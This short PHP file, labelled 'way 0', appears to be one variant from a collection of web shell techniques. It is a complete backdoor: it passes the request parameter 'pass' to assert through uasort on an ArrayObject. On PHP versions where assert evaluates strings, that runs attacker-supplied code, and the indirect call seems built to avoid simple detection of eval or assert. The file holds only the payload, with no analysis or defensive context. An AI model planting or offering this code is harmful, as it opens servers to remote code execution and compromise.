<?php
// way 0
$arr = new ArrayObject(array('test', $_REQUEST['pass']));
$arr->uasort('assert');
?>